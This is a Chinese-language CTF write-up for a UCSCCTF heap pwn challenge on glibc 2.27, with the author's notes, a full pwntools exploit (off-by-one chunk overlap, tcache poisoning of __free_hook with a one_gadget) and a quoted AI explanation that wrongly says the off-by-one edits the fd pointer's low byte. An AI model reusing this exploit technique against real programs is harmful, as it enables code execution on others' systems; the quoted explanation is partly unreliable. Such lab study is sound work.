题目来源[2025 UCSCCTF Pwn-wp(含附件)_pwn题目下载-CSDN博客](https://blog.csdn.net/XiDPPython/article/details/147377001?utm_source=miniapp_weixin)


![[Pasted image 20250424174707.png]]

创建的chunk的大小的不能超过0x100，
![[Pasted image 20250424174722.png]]
steinput的内部函数，存在off  by one,这个漏洞我看的时候也没看出来。还是执行附件的时候测一测吧。
![[Pasted image 20250424174937.png]]


![[Pasted image 20250424174733.png]]、


![[Pasted image 20250424174745.png]]


![[Pasted image 20250424174753.png]]

所以这一题的基本思路就是，通过off by one实现overlapping，然后通过overlapping实现对前一个多块的合并，合并后再申请，就是实现了对后面一个堆块的操作，我们需要的是对后一个堆块的fd指针改成我们需要的地址，我们可以改成free_malloc的地址到上面，然后我们再对free_malloc的地址进行解析，这个解析后的地址是真实地址，我们改成system_addr的真实地址，这样我们调用free的时候就会调用system函数了。

然后就拿到了权限。然后我现在的迷糊的地方就是泄露基址的地方。

#### 问题一：
我以前泄露基址的方法就是用free到unsortedbin中然后再释放读取main_arena+x的地址，然后我就会再将main_arena+x的地址减去x然后再减去0x10，这样就到了malloc_hook的地址了，但是这此我竟然发现泄露的地址竟然不是000结尾的。泄露的一直是错的。然后我不明白这个exp的方法为什么是要直接接受并且减去0x3EBD20？？我不明白！！！！

==我今天测试发现-240就到了__malloc_hook了，我是先打印然后对比还差多少，然后相减。==
![[Pasted image 20250425123709.png]]



![[Pasted image 20250424221550.png]]

![[Pasted image 20250424221557.png]]


![[Pasted image 20250424221610.png]]

![[Pasted image 20250424221618.png]]

![[Pasted image 20250424221626.png]]![[Pasted image 20250424221629.png]]

![[Pasted image 20250424222732.png]]

可以看到free_hook的函数的地址里面真实地址是我们填写的one_gadget的真实地址，说明我们已经将它的真实地址串改了。


我现在还是疑惑为什么？我们申请了add(13)但是heap还是没有显示我们申请我们申请的chunk，我们对比上面的heap的图显示我们并没有。这个我就很疑惑。为什么？？？

但是我知道为什么要申请add(13,0x38)，因为one_gadget的大小是和add（12，0x38）是同一个tcachebin的，所以得申请同一个tcachebin才能召唤出fake的。

![[Pasted image 20250424223120.png]]



#### exp
```c
from pwn import*

  

# context.log_level='debug'

context.terminal=['tmux','split','-h']

  
  

elf=ELF('./ucsc')

file = process('./ucsc')

libc =ELF('./libc-2.27.so')

  

menu = ":"  

def add(idx, size):  

    file.sendlineafter(menu, str(1))  

    file.sendlineafter("Index: ", str(idx))  

    file.sendlineafter("Size ", str(size))  

  

def edit(idx, content):  

    file.sendlineafter(menu, str(2))  

    file.sendlineafter("Index: ", str(idx))  

    file.sendlineafter("Content: ", content)  

  

def free(idx):  

    file.sendlineafter(menu, str(4))  

    file.sendlineafter("Index:", str(idx))  

  

def show(idx):  

    file.sendlineafter(menu, str(3))  

    file.sendlineafter("Index:", str(idx))

  

for i in range(7):

    add(i, 0x88)# malloc(0,1,2,3,4,5,6)

add(7, 0x88)#malloc(7)

add(8, 0x38)#malloc(8)

  

for i in range(7):

    free(i)#free(0,1,2,3,4,5,6) go in fastbin

  

free(7)#free(7) go in unsortedbin

for i in range(7):

    add(i, 0x88)#malloc(0,1,2,3,4,5,6) go back

  

add(7, 0x18)#malloc(7)

# gdb.attach(file)

  

show(7)

file.recvuntil("Content: ")

  
  
  

# libc_offset = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))

# print(hex(libc_offset))

# libc_base = libc_offset - 0x3EBD20

# malloc_hook = libc_base + libc.sym['__malloc_hook']

  

libc_offset0 = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))

libc_libc=libc_offset0-240

libc_base = libc_libc - libc.sym['__malloc_hook']

  

print(hex(libc_base))

  

free_hook = libc_base + libc.sym['__free_hook']

system_addr = libc_base + libc.sym['system']

one = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]

one_gadget = libc_base + one[2]

  
  

add(9, 0x38)

add(10, 0x38)

add(11, 0x38)

add(12, 0x38)

  

free(12)

edit(10, b'b'*0x38 + p8(0x71))#change the chunk size of 11 to 0x71

  

free(11)

  

add(11, 0x68)

edit(11, b'c'*0x38 + p64(41) + p64(free_hook))

add(12, 0x38)

add(13, 0x38)

edit(13, p64(one_gadget))

  

show(13)

print(hex(one_gadget))

# edit(12, b'/bin/sh\x00\x00')

free(1)

  
  
  

file.interactive()
```


并且我做这一题的时候我一直在思考这一题的off bu one在这一题的作用的是什么的时候我问了ai，看了他的解释我现在更加明了了。
下面是解释：

在堆溢出攻击中，使用“off-by-one”技术来修改下一个堆块的 `fd` 指针，使其指向 `free_hook`，是一种常见的方法。这种方法利用了堆管理器（如 glibc 的 `malloc` 和 `free`）的内部机制，通过覆盖下一个堆块的元数据来实现控制流劫持。

#### 为什么使用“off-by-one”技术？

1. **堆块结构**：在 glibc 的堆管理中，每个堆块（chunk）都有一个头部，包含大小和标志位等信息。如果堆块是已分配的，那么在堆块数据之后紧跟着下一个堆块的头部。如果堆块是已释放的，那么堆块数据区域会被用来存储 `fd` 和 `bk` 指针，用于链接到其他已释放的堆块。

2. **`off-by-one` 漏洞**：当存在一个 `off-by-one` 漏洞时，攻击者可以覆盖下一个堆块头部的第一个字节。如果下一个堆块是已释放的，那么这个覆盖会修改 `fd` 指针的最低有效字节。通过精心构造，可以使得 `fd` 指针指向一个特定的地址，如 `free_hook`。

#### 直接修改为 `free_hook` 的问题

直接修改下一个堆块的 `fd` 指针为 `free_hook` 的地址，而不使用 `off-by-one` 技术，可能会遇到以下问题：

1. **堆块状态**：下一个堆块必须是已释放的，且其 `fd` 指针被用于链接到其他已释放的堆块。如果下一个堆块是已分配的，那么直接修改其数据区域不会影响堆管理器的行为。

2. **堆管理器的检查**：glibc 的堆管理器在某些情况下会对堆块的元数据进行检查，以防止堆损坏。如果直接修改 `fd` 指针为一个不合理的值（如 `free_hook` 的地址），可能会触发这些检查，导致程序崩溃。

3. **`off-by-one` 的优势**：`off-by-one` 漏洞允许攻击者逐步、可控地修改堆块的元数据，而不会立即引起堆管理器的注意。通过逐步修改 `fd` 指针的最低有效字节，攻击者可以更精确地控制堆块的链接关系，从而实现更复杂的攻击。

#### 总结

在“疯狂复制”题目中，使用 `off-by-one` 技术来修改下一个堆块的 `fd` 指针，使其指向 `free_hook`，是一种有效的方法。直接修改为 `free_hook` 的地址可能会遇到堆管理器的检查和堆块状态的问题，因此不建议直接修改。`off-by-one` 技术提供了更精细的控制，使得攻击更容易成功。

如下：
![[d5c9a906dcc374ee8dbf3dcad9e64e73.jpg]]

#### 新的解题想法：

我在想我先用unsortedbin泄露一个__malloc_hook或者__free_hook的地址，不是真实地址，就只是在堆中的地址，泄露后我再利用off by one去泄露其真实地址，然后再接收，接收后我们再进行减去libc中的偏移，就得出了libc的基址，同时我们在off by one 的下一个堆块中的fd指针改成了我们需要的free_hook或malloc_hook的真实地址，我们还需要进行的是我们需要将one_gadget写入free_hook或malloc_hook的真实地址，这样我们在进行malloc或free的时候就可以拿到权限了。这还没试试。